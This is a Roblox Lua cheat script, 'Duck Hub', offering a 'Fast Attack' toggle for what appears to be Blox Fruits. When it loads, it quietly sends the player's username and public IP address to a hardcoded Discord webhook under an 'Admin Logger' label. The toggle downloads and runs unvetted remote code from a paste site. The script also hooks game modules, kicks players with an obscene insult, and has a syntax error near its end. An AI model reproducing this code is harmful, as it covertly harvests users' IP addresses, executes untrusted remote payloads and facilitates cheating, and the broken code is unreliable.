repeat
    wait()
until game:IsLoaded()

if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Đang Tải",
        Duration = 5
    }
)

-- Webhook Function
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data = request({
        Url = Url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
    return ""
end

-- Admin Logger
function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Duck Hub**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1311724779686072391/SoewtgK6hqu33eTiC7Oro1n2k7dzkLMhDgZF6uED8hQx8M-oicQbi0BYON0HnOT3ScKM", AdminLoggerMsg()) -- Post to admin webhook

-- HWID Check
local bannedHWID = ""

local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local playerHWID = player.UserId

    if playerHWID == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end

local fask = task 

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Duck Hub",
    SubTitle = "By UwU ( Duck hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    infor = Window:AddTab({ Title = "Home", Icon = "" }),
}

local Options = Fluent.Options

-- Screen GUI
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

UICorner.CornerRadius = UDim.new(0, 10) 
UICorner.Parent = ImageButton

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()

repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes")
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui")
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
wait(0.5)

if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end

if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
else
    game:GetService("Players").LocalPlayer:Kick(" Con Đĩ Mẹ Mày")
end

hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Death), function()end)
hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Respawn), function()end)

-- Add Fast Attack functionality
local FASTAT = Tabs.infor:AddToggle("Fast_Attack", {Title = "Fast Attack", Default = False })

FASTAT:OnChanged(function(value)
    if value then
        -- Runs the Fast Attack functionality when toggle is ON
        loadstring(game:HttpGet("https://pastefy.app/kTvdratR/raw"))()
        game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Fast Attack On",
        Duration = 5
    }
)
        -- Place your code for fast attack enable here (like changing attack speed, etc.)
    else
        game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Fast Attack Down",
        Duration = 5
    }
    end
end)
